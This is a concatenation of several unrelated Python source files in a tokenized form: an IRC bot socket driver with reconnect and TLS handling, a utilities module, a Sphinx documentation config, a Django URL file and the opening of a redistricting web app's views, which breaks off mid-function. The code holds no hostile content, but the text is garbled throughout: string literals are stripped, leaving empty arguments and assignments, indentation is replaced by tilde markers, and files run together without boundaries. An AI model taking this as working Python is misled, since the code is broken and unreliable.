# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
"""\nContains simple socket drivers.  Asyncore bugged (haha, pun!) me.\n""" \n 
\n 
from __future__ import division \n 
\n 
import os \n 
import time \n 
import errno \n 
import select \n 
import socket \n 
\n 
from . . import ( conf , drivers , log , utils , world ) \n 
from . . utils import minisix \n 
from . . utils . str import decode_raw_line \n 
\n 
try : \n 
~~~ import ssl \n 
SSLError = ssl . SSLError \n 
~~ except : \n 
~~~ drivers . log . debug ( \n 
) \n 
class SSLError ( Exception ) : \n 
~~~ pass \n 
\n 
\n 
~~ ~~ class SocketDriver ( drivers . IrcDriver , drivers . ServersMixin ) : \n 
~~~ _instances = [ ] \n 
_selecting = [ False ] # We want it to be mutable. \n 
def __init__ ( self , irc ) : \n 
~~~ self . _instances . append ( self ) \n 
assert irc is not None \n 
self . irc = irc \n 
drivers . IrcDriver . __init__ ( self , irc ) \n 
drivers . ServersMixin . __init__ ( self , irc ) \n 
self . conn = None \n 
self . _attempt = - 1 \n 
self . servers = ( ) \n 
self . eagains = 0 \n 
self . inbuffer = \n 
self . outbuffer = \n 
self . zombie = False \n 
self . connected = False \n 
self . writeCheckTime = None \n 
self . nextReconnectTime = None \n 
self . resetDelay ( ) \n 
if self . networkGroup . get ( ) . value and not in globals ( ) : \n 
~~~ drivers . log . error ( \n 
\n 
\n 
) \n 
self . ssl = False \n 
~~ else : \n 
~~~ self . ssl = self . networkGroup . get ( ) . value \n 
self . connect ( ) \n 
\n 
~~ ~~ def getDelay ( self ) : \n 
~~~ ret = self . currentDelay \n 
self . currentDelay = min ( self . currentDelay * 2 , \n 
conf . supybot . drivers . maxReconnectWait ( ) ) \n 
return ret \n 
\n 
~~ def resetDelay ( self ) : \n 
~~~ self . currentDelay = 10.0 \n 
\n 
~~ def _getNextServer ( self ) : \n 
~~~ oldServer = getattr ( self , , None ) \n 
server = drivers . ServersMixin . _getNextServer ( self ) \n 
if self . currentServer != oldServer : \n 
~~~ self . resetDelay ( ) \n 
~~ return server \n 
\n 
~~ def _handleSocketError ( self , e ) : \n 
\n 
\n 
~~~ if e . args [ 0 ] != 11 or self . eagains > 120 : \n 
~~~ drivers . log . disconnect ( self . currentServer , e ) \n 
if self in self . _instances : \n 
~~~ self . _instances . remove ( self ) \n 
~~ try : \n 
~~~ self . conn . close ( ) \n 
~~ except : \n 
~~~ pass \n 
~~ self . connected = False \n 
self . scheduleReconnect ( ) \n 
~~ else : \n 
~~~ log . debug ( , self . eagains ) \n 
self . eagains += 1 \n 
\n 
~~ ~~ def _sendIfMsgs ( self ) : \n 
~~~ if not self . connected : \n 
~~~ return \n 
~~ if not self . zombie : \n 
~~~ msgs = [ self . irc . takeMsg ( ) ] \n 
while msgs [ - 1 ] is not None : \n 
~~~ msgs . append ( self . irc . takeMsg ( ) ) \n 
~~ del msgs [ - 1 ] \n 
self . outbuffer += . join ( map ( str , msgs ) ) \n 
~~ if self . outbuffer : \n 
~~~ try : \n 
~~~ if minisix . PY2 : \n 
~~~ sent = self . conn . send ( self . outbuffer ) \n 
~~ else : \n 
~~~ sent = self . conn . send ( self . outbuffer . encode ( ) ) \n 
~~ self . outbuffer = self . outbuffer [ sent : ] \n 
self . eagains = 0 \n 
~~ except socket . error as e : \n 
~~~ self . _handleSocketError ( e ) \n 
~~ ~~ if self . zombie and not self . outbuffer : \n 
~~~ self . _reallyDie ( ) \n 
\n 
~~ ~~ @ classmethod \n 
def _select ( cls ) : \n 
~~~ if cls . _selecting [ 0 ] : \n 
~~~ return \n 
~~ try : \n 
~~~ cls . _selecting [ 0 ] = True \n 
for inst in cls . _instances : \n 
# Do not use a list comprehension here, we have to edit the list \n 
# and not to reassign it. \n 
~~~ if not inst . connected or ( minisix . PY3 and inst . conn . _closed ) or ( minisix . PY2 and \n 
inst . conn . _sock . __class__ is socket . _closedsocket ) : \n 
~~~ cls . _instances . remove ( inst ) \n 
~~ elif inst . conn . fileno ( ) == - 1 : \n 
~~~ inst . reconnect ( ) \n 
~~ ~~ if not cls . _instances : \n 
~~~ return \n 
~~ rlist , wlist , xlist = select . select ( [ x . conn for x in cls . _instances ] , \n 
[ ] , [ ] , conf . supybot . drivers . poll ( ) ) \n 
for instance in cls . _instances : \n 
~~~ if instance . conn in rlist : \n 
~~~ instance . _read ( ) \n 
~~ ~~ ~~ except select . error as e : \n 
~~~ if e . args [ 0 ] != errno . EINTR : \n 
\n 
~~~ raise \n 
~~ ~~ finally : \n 
~~~ cls . _selecting [ 0 ] = False \n 
~~ for instance in cls . _instances : \n 
~~~ if instance . irc and not instance . irc . zombie : \n 
~~~ instance . _sendIfMsgs ( ) \n 
\n 
\n 
~~ ~~ ~~ def run ( self ) : \n 
~~~ now = time . time ( ) \n 
if self . nextReconnectTime is not None and now > self . nextReconnectTime : \n 
~~~ self . reconnect ( ) \n 
~~ elif self . writeCheckTime is not None and now > self . writeCheckTime : \n 
~~~ self . _checkAndWriteOrReconnect ( ) \n 
~~ if not self . connected : \n 
\n 
\n 
~~~ time . sleep ( conf . supybot . drivers . poll ( ) ) \n 
return \n 
~~ self . _sendIfMsgs ( ) \n 
self . _select ( ) \n 
\n 
~~ def _read ( self ) : \n 
~~~ """Called by _select() when we can read data.""" \n 
try : \n 
~~~ self . inbuffer += self . conn . recv ( 1024 ) \n 
self . eagains = 0 \n 
lines = self . inbuffer . split ( ) \n 
self . inbuffer = lines . pop ( ) \n 
for line in lines : \n 
~~~ line = decode_raw_line ( line ) \n 
\n 
msg = drivers . parseMsg ( line ) \n 
if msg is not None and self . irc is not None : \n 
~~~ self . irc . feedMsg ( msg ) \n 
~~ ~~ ~~ except socket . timeout : \n 
~~~ pass \n 
~~ except SSLError as e : \n 
~~~ if e . args [ 0 ] == : \n 
~~~ pass \n 
~~ else : \n 
~~~ self . _handleSocketError ( e ) \n 
return \n 
~~ ~~ except socket . error as e : \n 
~~~ self . _handleSocketError ( e ) \n 
return \n 
~~ if self . irc and not self . irc . zombie : \n 
~~~ self . _sendIfMsgs ( ) \n 
\n 
~~ ~~ def connect ( self , ** kwargs ) : \n 
~~~ self . reconnect ( reset = False , ** kwargs ) \n 
\n 
~~ def reconnect ( self , wait = False , reset = True ) : \n 
~~~ self . _attempt += 1 \n 
self . nextReconnectTime = None \n 
if self . connected : \n 
~~~ drivers . log . reconnect ( self . irc . network ) \n 
if self in self . _instances : \n 
~~~ self . _instances . remove ( self ) \n 
~~ try : \n 
~~~ self . conn . shutdown ( socket . SHUT_RDWR ) \n 
~~ except : # "Transport endpoint not connected" \n 
~~~ pass \n 
~~ self . conn . close ( ) \n 
self . connected = False \n 
~~ if reset : \n 
~~~ drivers . log . debug ( , self . irc ) \n 
self . irc . reset ( ) \n 
~~ else : \n 
~~~ drivers . log . debug ( , self . irc ) \n 
~~ if wait : \n 
~~~ self . scheduleReconnect ( ) \n 
return \n 
~~ self . server = self . _getNextServer ( ) \n 
network_config = getattr ( conf . supybot . networks , self . irc . network ) \n 
socks_proxy = network_config . socksproxy ( ) \n 
try : \n 
~~~ if socks_proxy : \n 
~~~ import socks \n 
~~ ~~ except ImportError : \n 
~~~ log . error ( \n 
) \n 
socks_proxy = \n 
~~ if socks_proxy : \n 
~~~ address = self . server [ 0 ] \n 
~~ else : \n 
~~~ try : \n 
~~~ address = utils . net . getAddressFromHostname ( self . server [ 0 ] , \n 
attempt = self . _attempt ) \n 
~~ except ( socket . gaierror , socket . error ) as e : \n 
~~~ drivers . log . connectError ( self . currentServer , e ) \n 
self . scheduleReconnect ( ) \n 
return \n 
~~ ~~ port = self . server [ 1 ] \n 
drivers . log . connect ( self . currentServer ) \n 
try : \n 
~~~ self . conn = utils . net . getSocket ( address , port = port , \n 
socks_proxy = socks_proxy , \n 
vhost = conf . supybot . protocols . irc . vhost ( ) , \n 
vhostv6 = conf . supybot . protocols . irc . vhostv6 ( ) , \n 
) \n 
~~ except socket . error as e : \n 
~~~ drivers . log . connectError ( self . currentServer , e ) \n 
self . scheduleReconnect ( ) \n 
return \n 
# We allow more time for the connect here, since it might take longer. \n 
# At least 10 seconds. \n 
~~ self . conn . settimeout ( max ( 10 , conf . supybot . drivers . poll ( ) * 10 ) ) \n 
try : \n 
# Connect before SSL, otherwise SSL is disabled if we use SOCKS. \n 
# See http://stackoverflow.com/q/16136916/539465 \n 
~~~ self . conn . connect ( ( address , port ) ) \n 
if network_config . ssl ( ) : \n 
~~~ self . starttls ( ) \n 
~~ elif not network_config . requireStarttls ( ) : \n 
~~~ drivers . log . warning ( ( \n 
\n 
\n 
\n 
% self . irc . network ) \n 
\n 
~~ def setTimeout ( ) : \n 
~~~ self . conn . settimeout ( conf . supybot . drivers . poll ( ) ) \n 
~~ conf . supybot . drivers . poll . addCallback ( setTimeout ) \n 
setTimeout ( ) \n 
self . connected = True \n 
self . resetDelay ( ) \n 
~~ except socket . error as e : \n 
~~~ if e . args [ 0 ] == 115 : \n 
~~~ now = time . time ( ) \n 
when = now + 60 \n 
whenS = log . timestamp ( when ) \n 
drivers . log . debug ( \n 
, whenS ) \n 
self . writeCheckTime = when \n 
~~ else : \n 
~~~ drivers . log . connectError ( self . currentServer , e ) \n 
self . scheduleReconnect ( ) \n 
~~ return \n 
~~ self . _instances . append ( self ) \n 
\n 
~~ def _checkAndWriteOrReconnect ( self ) : \n 
~~~ self . writeCheckTime = None \n 
drivers . log . debug ( ) \n 
( _ , w , _ ) = select . select ( [ ] , [ self . conn ] , [ ] , 0 ) \n 
if w : \n 
~~~ drivers . log . debug ( ) \n 
self . connected = True \n 
self . resetDelay ( ) \n 
~~ else : \n 
~~~ drivers . log . connectError ( self . currentServer , ) \n 
self . reconnect ( ) \n 
\n 
~~ ~~ def scheduleReconnect ( self ) : \n 
~~~ when = time . time ( ) + self . getDelay ( ) \n 
if not world . dying : \n 
~~~ drivers . log . reconnect ( self . irc . network , when ) \n 
~~ if self . nextReconnectTime : \n 
~~~ drivers . log . error ( \n 
\n 
\n 
) \n 
~~ self . nextReconnectTime = when \n 
\n 
~~ def die ( self ) : \n 
~~~ if self in self . _instances : \n 
~~~ self . _instances . remove ( self ) \n 
~~ self . zombie = True \n 
if self . nextReconnectTime is not None : \n 
~~~ self . nextReconnectTime = None \n 
~~ if self . writeCheckTime is not None : \n 
~~~ self . writeCheckTime = None \n 
~~ drivers . log . die ( self . irc ) \n 
\n 
~~ def _reallyDie ( self ) : \n 
~~~ if self . conn is not None : \n 
~~~ self . conn . close ( ) \n 
~~ drivers . IrcDriver . die ( self ) \n 
# self.irc.die() Kill off the ircs yourself, jerk! \n 
\n 
~~ def name ( self ) : \n 
~~~ return % ( self . __class__ . __name__ , self . irc ) \n 
\n 
~~ def starttls ( self ) : \n 
~~~ assert in globals ( ) \n 
network_config = getattr ( conf . supybot . networks , self . irc . network ) \n 
certfile = network_config . certfile ( ) \n 
if not certfile : \n 
~~~ certfile = conf . supybot . protocols . irc . certfile ( ) \n 
~~ if not certfile : \n 
~~~ certfile = None \n 
~~ elif not os . path . isfile ( certfile ) : \n 
~~~ drivers . log . warning ( % \n 
certfile ) \n 
certfile = None \n 
~~ verifyCertificates = conf . supybot . protocols . ssl . verifyCertificates ( ) \n 
if not verifyCertificates : \n 
~~~ drivers . log . warning ( \n 
\n 
\'supybot.protocols.ssl.verifyCertificates to "true" \' \n 
) \n 
~~ try : \n 
~~~ self . conn = utils . net . ssl_wrap_socket ( self . conn , \n 
logger = drivers . log , hostname = self . server [ 0 ] , \n 
certfile = certfile , \n 
verify = verifyCertificates , \n 
trusted_fingerprints = network_config . ssl . serverFingerprints ( ) , \n 
ca_file = network_config . ssl . authorityCertificate ( ) , \n 
) \n 
~~ except getattr ( ssl , , None ) as e : \n 
# Default to None for old Python version, which do not have \n 
# CertificateError \n 
~~~ drivers . log . error ( ( \n 
\n 
\n 
\n 
) \n 
% ( self . irc . network , e . args [ 0 ] ) ) \n 
raise ssl . SSLError ( \n 
) \n 
~~ except ssl . SSLError as e : \n 
~~~ drivers . log . error ( ( \n 
\n 
\n 
\n 
) \n 
% ( self . irc . network , e . args [ 1 ] ) ) \n 
raise ssl . SSLError ( \n 
) \n 
\n 
\n 
\n 
~~ ~~ ~~ Driver = SocketDriver \n 
\n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=79: \n 
\n 
### \n 
# Copyright (c) 2005-2009, Jeremiah Fincher \n 
# Copyright (c) 2009-2010, James McCoy \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
import sys \n 
import types \n 
import fnmatch \n 
import threading \n 
\n 
def universalImport ( * names ) : \n 
~~~ """Attempt to import the given modules, in order, returning the first\n    successfully imported module.  ImportError will be raised, as usual, if\n    no imports succeed.  To emulate ``from ModuleA import ModuleB\'\', pass the\n    string \'ModuleA.ModuleB\'""" \n 
f = sys . _getframe ( 1 ) \n 
for name in names : \n 
~~~ try : \n 
\n 
~~~ ret = __import__ ( name , f . f_globals ) \n 
~~ except ImportError : \n 
~~~ continue \n 
~~ else : \n 
~~~ if in name : \n 
~~~ parts = name . split ( ) [ 1 : ] \n 
while parts : \n 
~~~ ret = getattr ( ret , parts [ 0 ] ) \n 
del parts [ 0 ] \n 
~~ ~~ return ret \n 
~~ ~~ raise ImportError ( . join ( names ) ) \n 
\n 
~~ def changeFunctionName ( f , name , doc = None ) : \n 
~~~ if doc is None : \n 
~~~ doc = f . __doc__ \n 
~~ if hasattr ( f , ) : \n 
~~~ closure = f . __closure__ \n 
~~ else : \n 
# Pypy \n 
~~~ closure = f . func_closure \n 
~~ newf = types . FunctionType ( f . __code__ , f . __globals__ , name , \n 
f . __defaults__ , closure ) \n 
newf . __doc__ = doc \n 
return newf \n 
\n 
~~ class Object ( object ) : \n 
~~~ def __ne__ ( self , other ) : \n 
~~~ return not self == other \n 
\n 
~~ ~~ class MetaSynchronized ( type ) : \n 
~~~ METHODS = \n 
LOCK = \n 
def __new__ ( cls , name , bases , dict ) : \n 
~~~ sync = set ( ) \n 
for base in bases : \n 
~~~ if hasattr ( base , MetaSynchronized . METHODS ) : \n 
~~~ sync . update ( getattr ( base , MetaSynchronized . METHODS ) ) \n 
~~ ~~ if MetaSynchronized . METHODS in dict : \n 
~~~ sync . update ( dict [ MetaSynchronized . METHODS ] ) \n 
~~ if sync : \n 
~~~ def synchronized ( f ) : \n 
~~~ def g ( self , * args , ** kwargs ) : \n 
~~~ lock = getattr ( self , MetaSynchronized . LOCK ) \n 
lock . acquire ( ) \n 
try : \n 
~~~ f ( self , * args , ** kwargs ) \n 
~~ finally : \n 
~~~ lock . release ( ) \n 
~~ ~~ return changeFunctionName ( g , f . __name__ , f . __doc__ ) \n 
~~ for attr in sync : \n 
~~~ if attr in dict : \n 
~~~ dict [ attr ] = synchronized ( dict [ attr ] ) \n 
~~ ~~ original__init__ = dict . get ( ) \n 
def __init__ ( self , * args , ** kwargs ) : \n 
~~~ if not hasattr ( self , MetaSynchronized . LOCK ) : \n 
~~~ setattr ( self , MetaSynchronized . LOCK , threading . RLock ( ) ) \n 
~~ if original__init__ : \n 
~~~ original__init__ ( self , * args , ** kwargs ) \n 
~~ else : \n 
# newclass is defined below. \n 
~~~ super ( newclass , self ) . __init__ ( * args , ** kwargs ) \n 
~~ ~~ dict [ ] = __init__ \n 
~~ newclass = super ( MetaSynchronized , cls ) . __new__ ( cls , name , bases , dict ) \n 
return newclass \n 
~~ ~~ Synchronized = MetaSynchronized ( , ( ) , { } ) \n 
\n 
# Translate glob to regular expression, trimming the "match EOL" portion of \n 
# the regular expression. \n 
# Post-2.6 uses \\Z(?ms) per http://issues.python.org/6665 \n 
def glob2re ( g ) : \n 
~~~ return fnmatch . translate ( g ) [ : - 7 ] \n 
\n 
\n 
~~ _debug_software_name = \n 
_debug_software_version = None \n 
# From http://code.activestate.com/recipes/52215-get-more-information-from-tracebacks/ \n 
def collect_extra_debug_data ( ) : \n 
~~~ """\n    Print the usual traceback information, followed by a listing of all the\n    local variables in each frame.\n    """ \n 
data = \n 
try : \n 
~~~ tb = sys . exc_info ( ) [ 2 ] \n 
stack = [ ] \n 
\n 
while tb : \n 
~~~ stack . append ( tb . tb_frame ) \n 
tb = tb . tb_next \n 
~~ ~~ finally : \n 
~~~ del tb \n 
\n 
~~ if _debug_software_version : \n 
~~~ data += % ( _debug_software_name , _debug_software_version ) \n 
~~ else : \n 
~~~ data += % _debug_software_name \n 
\n 
~~ data += \n 
for frame in stack : \n 
~~~ data += \n 
data += ( % ( frame . f_code . co_name , \n 
frame . f_code . co_filename , \n 
frame . f_lineno ) ) \n 
frame_locals = frame . f_locals \n 
for inspected in ( , ) : \n 
~~~ if inspected in frame_locals : \n 
~~~ if hasattr ( frame_locals [ inspected ] , ) and frame_locals [ inspected ] . __dict__ : \n 
~~~ for ( key , value ) in frame_locals [ inspected ] . __dict__ . items ( ) : \n 
~~~ frame_locals [ % ( inspected , key ) ] = value \n 
~~ ~~ ~~ ~~ for key , value in frame_locals . items ( ) : \n 
~~~ if key == : \n 
# This is flooding \n 
~~~ continue \n 
~~ data += ( % key ) \n 
#We have to be careful not to cause a new error in our error \n 
#printer! Calling str() on an unknown object could cause an \n 
\n 
try : \n 
~~~ data += repr ( value ) + \n 
~~ except : \n 
~~~ data += \n 
~~ ~~ ~~ data += \n 
data += \n 
data += \n 
data += \n 
data += \n 
return data \n 
\n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=78: \n 
# -*- coding: utf-8 -*- \n 
# \n 
# Pandora API documentation documentation build configuration file, created by \n 
# sphinx-quickstart on Mon Jun 30 21:53:24 2014. \n 
# \n 
# This file is execfile()d with the current directory set to its containing dir. \n 
# \n 
# Note that not all possible configuration values are present in this \n 
# autogenerated file. \n 
# \n 
# All configuration values have a default; values that are commented out \n 
# serve to show the default. \n 
\n 
~~ import sys , os \n 
\n 
# If extensions (or modules to document with autodoc) are in another directory, \n 
# add these directories to sys.path here. If the directory is relative to the \n 
# documentation root, use os.path.abspath to make it absolute, like shown here. \n 
\n 
\n 
# -- General configuration ----------------------------------------------------- \n 
\n 
# If your documentation needs a minimal Sphinx version, state it here. \n 
\n 
\n 
# Add any Sphinx extension module names here, as strings. They can be extensions \n 
\n 
extensions = [ ] \n 
\n 
# Add any paths that contain templates here, relative to this directory. \n 
templates_path = [ ] \n 
\n 
# The suffix of source filenames. \n 
source_suffix = \n 
\n 
# The encoding of source files. \n 
\n 
\n 
# The master toctree document. \n 
master_doc = \n 
\n 
# General information about the project. \n 
project = \n 
copyright = \n 
\n 
\n 
# |version| and |release|, also used in various other places throughout the \n 
# built documents. \n 
# \n 
# The short X.Y version. \n 
version = \n 
# The full version, including alpha/beta/rc tags. \n 
release = \n 
\n 
# The language for content autogenerated by Sphinx. Refer to documentation \n 
# for a list of supported languages. \n 
#language = None \n 
\n 
# There are two options for replacing |today|: either, you set today to some \n 
# non-false value, then it is used: \n 
\n 
# Else, today_fmt is used as the format for a strftime call. \n 
\n 
\n 
# List of patterns, relative to source directory, that match files and \n 
# directories to ignore when looking for source files. \n 
exclude_patterns = [ ] \n 
\n 
# The reST default role (used for this markup: `text`) to use for all documents. \n 
#default_role = None \n 
\n 
\n 
#add_function_parentheses = True \n 
\n 
# If true, the current module name will be prepended to all description \n 
# unit titles (such as .. function::). \n 
#add_module_names = True \n 
\n 
# If true, sectionauthor and moduleauthor directives will be shown in the \n 
# output. They are ignored by default. \n 
#show_authors = False \n 
\n 
# The name of the Pygments (syntax highlighting) style to use. \n 
pygments_style = \n 
\n 
# A list of ignored prefixes for module index sorting. \n 
#modindex_common_prefix = [] \n 
\n 
\n 
# -- Options for HTML output --------------------------------------------------- \n 
\n 
# The theme to use for HTML and HTML Help pages.  See the documentation for \n 
# a list of builtin themes. \n 
html_theme = \n 
\n 
# Theme options are theme-specific and customize the look and feel of a theme \n 
# further.  For a list of options available for each theme, see the \n 
# documentation. \n 
#html_theme_options = {} \n 
\n 
# Add any paths that contain custom themes here, relative to this directory. \n 
#html_theme_path = [] \n 
\n 
# The name for this set of Sphinx documents.  If None, it defaults to \n 
# "<project> v<release> documentation". \n 
#html_title = None \n 
\n 
# A shorter title for the navigation bar.  Default is the same as html_title. \n 
#html_short_title = None \n 
\n 
# The name of an image file (relative to this directory) to place at the top \n 
# of the sidebar. \n 
#html_logo = None \n 
\n 
# The name of an image file (within the static path) to use as favicon of the \n 
# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32 \n 
# pixels large. \n 
#html_favicon = None \n 
\n 
# Add any paths that contain custom static files (such as style sheets) here, \n 
# relative to this directory. They are copied after the builtin static files, \n 
# so a file named "default.css" will overwrite the builtin "default.css". \n 
html_static_path = [ ] \n 
\n 
\n 
# using the given strftime format. \n 
\n 
\n 
# If true, SmartyPants will be used to convert quotes and dashes to \n 
# typographically correct entities. \n 
#html_use_smartypants = True \n 
\n 
# Custom sidebar templates, maps document names to template names. \n 
#html_sidebars = {} \n 
\n 
# Additional templates that should be rendered to pages, maps page names to \n 
# template names. \n 
#html_additional_pages = {} \n 
\n 
# If false, no module index is generated. \n 
#html_domain_indices = True \n 
\n 
# If false, no index is generated. \n 
#html_use_index = True \n 
\n 
# If true, the index is split into individual pages for each letter. \n 
#html_split_index = False \n 
\n 
# If true, links to the reST sources are added to the pages. \n 
#html_show_sourcelink = True \n 
\n 
# If true, "Created using Sphinx" is shown in the HTML footer. Default is True. \n 
#html_show_sphinx = True \n 
\n 
# If true, "(C) Copyright ..." is shown in the HTML footer. Default is True. \n 
#html_show_copyright = True \n 
\n 
# If true, an OpenSearch description file will be output, and all pages will \n 
# contain a <link> tag referring to it.  The value of this option must be the \n 
# base URL from which the finished HTML is served. \n 
\n 
\n 
# This is the file name suffix for HTML files (e.g. ".xhtml"). \n 
#html_file_suffix = None \n 
\n 
# Output file base name for HTML help builder. \n 
htmlhelp_basename = \n 
\n 
\n 
# -- Options for LaTeX output -------------------------------------------------- \n 
\n 
latex_elements = { \n 
\n 
\n 
\n 
\n 
\n 
\n 
# Additional stuff for the LaTeX preamble. \n 
\n 
} \n 
\n 
# Grouping the document tree into LaTeX files. List of tuples \n 
# (source start file, target name, title, author, documentclass [howto/manual]). \n 
latex_documents = [ \n 
( , , , \n 
, ) , \n 
] \n 
\n 
# The name of an image file (relative to this directory) to place at the top of \n 
# the title page. \n 
#latex_logo = None \n 
\n 
# For "manual" documents, if this is true, then toplevel headings are parts, \n 
# not chapters. \n 
#latex_use_parts = False \n 
\n 
# If true, show page references after internal links. \n 
#latex_show_pagerefs = False \n 
\n 
# If true, show URL addresses after external links. \n 
#latex_show_urls = False \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#latex_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#latex_domain_indices = True \n 
\n 
\n 
# -- Options for manual page output -------------------------------------------- \n 
\n 
# One entry per manual page. List of tuples \n 
# (source start file, name, description, authors, manual section). \n 
man_pages = [ \n 
( , , , \n 
[ ] , 1 ) \n 
] \n 
\n 
# If true, show URL addresses after external links. \n 
#man_show_urls = False \n 
\n 
\n 
# -- Options for Texinfo output ------------------------------------------------ \n 
\n 
# Grouping the document tree into Texinfo files. List of tuples \n 
# (source start file, target name, title, author, \n 
#  dir menu entry, description, category) \n 
texinfo_documents = [ \n 
( , , , \n 
, , , \n 
) , \n 
] \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#texinfo_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#texinfo_domain_indices = True \n 
\n 
\n 
\n 
try : \n 
~~~ from django . conf . urls import patterns , url \n 
~~ except ImportError : \n 
~~~ from django . conf . urls . defaults import patterns , url # Django < 1.4 \n 
\n 
~~ urlpatterns = patterns ( , \n 
url ( , , name = ) , \n 
url ( , , name = ) , ) \n 
\n 
"""\nDjango views used by the redistricting application.\n\nThe methods in redistricting.views define the views used to interact with\nthe models in the redistricting application. Each method relates to one \ntype of output url. There are views that return GeoJSON, JSON, and HTML.\n\nThis file is part of The Public Mapping Project\nhttps://github.com/PublicMapping/\n\nLicense:\n    Copyright 2010-2012 Micah Altman, Michael McDonald\n\n    Licensed under the Apache License, Version 2.0 (the "License");\n    you may not use this file except in compliance with the License.\n    You may obtain a copy of the License at\n\n        http://www.apache.org/licenses/LICENSE-2.0\n\n    Unless required by applicable law or agreed to in writing, software\n    distributed under the License is distributed on an "AS IS" BASIS,\n    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n    See the License for the specific language governing permissions and\n    limitations under the License.\n\nAuthor: \n    Andrew Jennings, David Zwarg, Kenny Shepard\n""" \n 
\n 
from django . http import * \n 
from django . core import serializers \n 
from django . core . exceptions import ValidationError , SuspiciousOperation , ObjectDoesNotExist \n 
from django . db import IntegrityError , connection , transaction \n 
from django . shortcuts import render_to_response \n 
from django . core . urlresolvers import reverse \n 
from django . core . context_processors import csrf \n 
from django . contrib . comments . models import Comment \n 
from django . contrib . comments . forms import CommentForm \n 
from django . contrib . contenttypes . models import ContentType \n 
from django . contrib . auth . decorators import login_required , user_passes_test \n 
from django . contrib . sessions . models import Session \n 
from django . contrib . sessions . backends . db import SessionStore \n 
from django . contrib . gis . geos . collections import MultiPolygon \n 
from django . contrib . gis . geos import GEOSGeometry \n 
from django . contrib . gis . gdal import * \n 
from django . contrib . gis . gdal . libgdal import lgdal \n 
from django . contrib . sites . models import Site \n 
from django . contrib import humanize \n 
from django . template import loader , Context as DjangoContext , RequestContext \n 
from django . utils import simplejson as json , translation \n 
from django . utils . translation import ugettext as _ , ungettext as _n \n 
from django . template . defaultfilters import slugify , force_escape \n 
from django . conf import settings \n 
from tagging . utils import parse_tag_input \n 
from tagging . models import Tag , TaggedItem \n 
from datetime import datetime , time , timedelta \n 
from decimal import * \n 
from functools import wraps \n 
from redistricting . calculators import * \n 
from redistricting . models import * \n 
from redistricting . tasks import * \n 
import random , string , math , types , copy , time , threading , traceback , os \n 
import commands , sys , tempfile , csv , hashlib , inflect , logging \n 
\n 
import ModestMaps \n 
from PIL import Image , ImageChops , ImageMath \n 
import urllib , urllib2 \n 
from xhtml2pdf . pisa import CreatePDF \n 
import StringIO \n 
\n 
logger = logging . getLogger ( __name__ ) \n 
\n 
# This constant is reused in multiple places. \n 
UNASSIGNED_DISTRICT_ID = 0 \n 
\n 
def using_unique_session ( u ) : \n 
~~~ """\n    A test to determine if the user of the application is using a unique \n    session. Each user is permitted one unique session (one session in the\n    django_session table that has not yet expired). If the user exceeds\n    this quota, this test fails, and the user will get bounced to the login\n    url.\n\n    Parameters:\n        u - The user. May be anonymous or registered.\n\n    Returns:\n        True - the user is an AnonymousUser or the number of sessions open\n               by the user is only 1 (one must be open to make the request)\n        False - the user is registered and has more than one open session.\n    """ \n 
if u . is_anonymous ( ) or u . is_superuser : \n 
~~~ return True \n 
\n 
~~ sessions = Session . objects . all ( ) \n 
count = 0 \n 
for session in sessions : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
\n 
if in decoded and decoded [ ] == u . id : \n 
~~~ if in decoded and decoded [ ] < datetime . now ( ) : \n 
# delete this session of mine; it is dormant \n 
~~~ Session . objects . filter ( session_key = session . session_key ) . delete ( ) \n 
~~ else : \n 
~~~ count += 1 \n 
~~ ~~ ~~ except SuspiciousOperation : \n 
~~~ logger . debug ( "SuspiciousOperation caught while checking the number of sessions a user has open. Session key: %s" \n 
# after counting all the open and active sessions, go back through \n 
# the session list and assign the session count to all web sessions \n 
# for this user. (do this for inactive sessions, too) \n 
~~ ~~ for session in sessions : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
